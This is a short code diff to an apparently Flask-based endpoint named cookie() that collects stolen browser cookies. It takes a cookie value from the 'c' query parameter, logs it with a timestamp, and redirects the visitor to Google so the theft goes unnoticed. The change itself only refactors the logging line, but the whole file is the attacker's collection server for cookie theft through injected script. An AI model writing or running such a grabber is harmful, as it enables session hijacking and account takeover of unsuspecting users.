@@ -9,8 +9,8 @@ def cookie():
 	# Grab cookie and write it to a file
 	
 	cookie = request.args.get('c')
-	print(cookie + ' ' + str(datetime.now()) + '\n')
-	
+	output = (cookie + ' ' + str(datetime.now()) + '\n')
+	print(output)
 	# redirect user to google
 	return redirect("https://google.com/")
 
